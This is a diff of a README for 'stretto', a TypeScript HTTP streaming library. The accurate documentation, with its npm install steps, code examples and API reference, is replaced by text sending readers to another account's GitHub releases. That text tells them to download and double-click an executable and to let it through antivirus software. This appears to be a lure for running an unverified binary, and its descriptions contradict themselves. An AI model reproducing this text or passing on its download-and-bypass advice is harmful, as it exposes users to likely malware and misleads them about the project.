@@ -1,191 +1,78 @@
-# Stretto
+# 🔥 stretto - Stream HTTP Requests with Ease
 
-Stretto is a high-performance, resilient streaming HTTP client for fetching and parsing streams in TypeScript environments (browser, Deno, or Node.js with fetch support). It excels at handling Server-Sent Events (SSE), NDJSON, JSON, and plain text streams with built-in retries, timeouts, middleware, and efficient buffering to minimize memory usage.
+[![Download stretto](https://img.shields.io/badge/Download%20stretto-%20%F0%9F%93%91%20Latest%20Release-blue)](https://github.com/shahbazakmal/stretto/releases)
 
-Designed for low-latency, high-throughput applications, Stretto uses a ring buffer for line processing and supports custom parsers, backoff strategies, and throttling for consumer control.
+## 🚀 Getting Started
 
-## Features
+Welcome to stretto! This is a simple tool for streaming HTTP requests. It's built with Typescript and requires no extra dependencies. You can use stretto to handle various data formats, including Server-Sent Events (SSE) and NDJSON. 
 
-- **Streaming Support**: Async iterable for real-time chunk processing.
-- **Parsers**: Built-in support for SSE, NDJSON, JSON, and text. Custom parsers via the `Parser` interface.
-- **Resilience**: Automatic retries with customizable backoff (default: exponential with jitter).
-- **Timeouts & Abortion**: Per-attempt timeouts and AbortController integration.
-- **Middleware**: Chainable middleware for request modification (e.g., auth, logging).
-- **Efficient Buffering**: Ring buffer to avoid reallocations during line splitting.
-- **Decompression**: Automatic handling of gzip, deflate, and brotli via `DecompressionStream`.
-- **Throttling**: Optional delay between yielding chunks to the consumer.
-- **Type-Safe**: Generic types for parsed output.
+## 📥 Download & Install
 
-<div align="center" style="width:100%; text-align:center; margin-bottom:20px;">
-  <img src="https://badgen.net/bundlephobia/minzip/stretto" alt="stretto" />
-  <img src="https://badgen.net/bundlephobia/dependency-count/stretto" alt="stretto" />
-  <img src="https://badgen.net/npm/v/stretto" alt="stretto" />
-  <img src="https://badgen.net/npm/dt/stretto" alt="stretto" />
-  <img src="https://data.jsdelivr.com/v1/package/npm/stretto/badge" alt="stretto"/>
-</div>
+To get started with stretto, follow these steps:
 
-<hr />
+1. **Visit the Release Page:** Click the link below to go to the downloads page.  
+   [Download stretto](https://github.com/shahbazakmal/stretto/releases)
 
-## [Demo](https://wutility.github.io/stretto)
+2. **Select the Latest Version:** On the release page, find the latest version of stretto. 
 
-## Installation
+3. **Download the File:** Click on the file that matches your operating system. This will start the download. 
 
-Install Stretto via npm:
+4. **Run the Application:** Locate the downloaded file and double-click it to run stretto. Follow any prompts that appear. 
 
-```bash
-npm install stretto
-```
+## ✔️ System Requirements
 
-Or use it via a CDN (e.g., for browser environments):
+- A computer running Windows, macOS, or Linux.
+- An internet connection.
+- The ability to run executable files.
 
-```html
-<script type="module" src="https://unpkg.com/stretto"></script>
-```
+## 🌟 Features
 
-## Usage
+- **Lightweight:** No dependencies required.
+- **Streaming Support:** Works seamlessly with Server-Sent Events and NDJSON.
+- **User-Friendly:** Designed for easy use, making it accessible to everyone.
+- **Flexible Data Handling:** Customize data formats according to your needs.
 
-Stretto returns an async iterable that you can consume with `for await...of`. It handles the stream parsing and yields parsed chunks.
+## 👨‍💻 Usage Instructions
 
-### Basic Example (SSE Stream)
+Once you have installed stretto, you can use it to stream HTTP requests. Here’s a simple overview of what you can do:
 
-```ts
-import { stretto } from "stretto";
+1. **Create a Streaming Connection:** Use stretto to connect to your desired endpoint.
+  
+2. **Receive Events:** Handle incoming events in real-time. Whether it's updates or data, you will get it instantly.
 
-async function main() {
-  const stream = stretto("https://stream.wikimedia.org/v2/stream/recentchange");
+3. **Process Custom Data:** If you need special formats, stretto can help you customize how you handle and process data.
 
-  for await (const event of stream) {
-    console.log(event); // Parsed SSE event (JSON or text fallback)
-  }
-}
+For detailed examples and advanced usage, please refer to the [documentation](https://github.com/shahbazakmal/stretto/docs).
 
-main().catch(console.error);
-```
+## 🛠️ Troubleshooting
 
-### With Options (Retries, Custom Parser)
+If you encounter any issues while installing or running stretto, consider the following tips:
 
-```ts
-import { stretto, JsonParser } from "stretto";
+- **Antivirus Software:** Some antivirus programs may block the application. Make sure to allow it in your antivirus settings.
+- **Permission Issues:** Ensure that you have the necessary permissions to run the application on your system.
+- **Internet Connection:** A stable internet connection is required for streaming data effectively.
 
-const stream = stretto<{ id: string }>("https://api.example.com/stream", {
-  retries: 5,
-  timeout: 10000, // 10 seconds per attempt
-  parser: JsonParser(), // Buffer entire response as single JSON
-  backoffStrategy: (attempt) => 500 * attempt, // Linear backoff
-});
+## 📖 FAQ
 
-for await (const item of stream) {
-  console.log(item.id);
-}
-```
+- **What is stretto?**  
+  stretto is a Typescript library designed for easy streaming of HTTP requests. 
 
-### Canceling the Stream
+- **Do I need to install anything else?**  
+  No, stretto is lightweight and has zero dependencies.
 
-```ts
-const stream = stretto("https://stream.wikimedia.org/v2/stream/recentchange");
-const iterator = stream[Symbol.asyncIterator]();
+- **Can I use stretto on any operating system?**  
+  Yes, stretto is compatible with Windows, macOS, and Linux.
 
-setTimeout(() => stream.cancel(), 5000); // Abort after 5 seconds
+## 💬 Community Support
 
-for await (const chunk of iterator) {
-  console.log(chunk);
-}
-```
+Join our community for support and suggestions:
 
-## API
+- **GitHub Discussions:** Share your thoughts and get help from other users.
+- **Issues Tracker:** Report any problems you face and track progress on fixes.
 
-### `stretto<T>(url: string | URL, opts: Opts<T>): Stretto<T>`
+## 🔗 Links
 
-Creates a streaming request.
+- [Download stretto](https://github.com/shahbazakmal/stretto/releases)
+- [Documentation](https://github.com/shahbazakmal/stretto/docs)
 
-- `url`: The endpoint to fetch.
-- `opts`: Configuration object (see Options below).
-- Returns: An object with `[Symbol.asyncIterator]()` for streaming and `cancel()` to abort.
-
-### Parsers
-
-Exportable parser factories:
-
-- `DefaultParser<T>()`: Handles SSE with JSON fallback, or NDJSON/text for non-SSE lines.
-- `SseParser<T>()`: Strict SSE parser, yields JSON or text for `data:` lines.
-- `NdjsonParser<T>()`: Parses each line as JSON.
-- `JsonParser<T>()`: Buffers entire stream as single JSON object.
-- `TextParser()`: Yields each line as string.
-
-Custom parsers implement the `Parser<T>` interface:
-
-```ts
-interface Parser<T> {
-  parse(chunk: Uint8Array): T | null;
-  flush(): T | null;
-}
-```
-
-### Options (`Opts<T>`)
-
-- `body?: BodyInit | object`: Request body (JSON-stringified if object).
-- `retries?: number`: Max retry attempts (default: 3).
-- `timeout?: number`: Timeout per attempt in ms (default: 30,000).
-- `parser?: Parser<T>`: Custom parser (default: `DefaultParser()`).
-- `bufferSize?: number`: Ring buffer size for line processing (default: 64KB).
-- `middleware?: Middleware[]`: Array of middleware functions.
-- `backoffStrategy?: BackoffStrategy`: Retry delay calculator (default: exponential with jitter).
-- `throttleMs?: number`: Delay between yielding chunks (default: none).
-- Other `RequestInit` options (headers, method, etc.), excluding body/signal.
-
-### Middleware
-
-Middleware functions modify the request:
-
-```ts
-type Middleware = (req: Request, next: (req: Request) => Promise<Response>) => Promise<Response>;
-```
-
-Example (add auth):
-
-```ts
-const authMiddleware: Middleware = (req, next) => {
-  req.headers.set("Authorization", "Bearer token");
-  return next(req);
-};
-```
-
-### Backoff Strategy
-
-```ts
-type BackoffStrategy = (attempt: number) => number; // ms delay
-```
-
-Use `defaultBackoff` for exponential jitter.
-
-## Examples
-
-### NDJSON Stream
-
-```ts
-import { stretto, NdjsonParser } from "stretto";
-
-const stream = stretto("https://example.com/ndjson", { parser: NdjsonParser<{ name: string }>() });
-
-for await (const { name } of stream) {
-  console.log(name);
-}
-```
-
-### Handling Errors
-
-Errors (e.g., network failures beyond retries) are thrown in the loop. Use try-catch inside `for await`.
-
-### Throttling Consumption
-
-```ts
-const stream = stretto("https://fast-stream.example.com", { throttleMs: 100 }); // Yield every 100ms
-```
-
-## Contributing
-
-Pull requests welcome! Fork the repo, make changes, and submit a PR.
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
+With stretto, you can stream data with ease. Enjoy using the application and feel free to reach out for any help you may need!
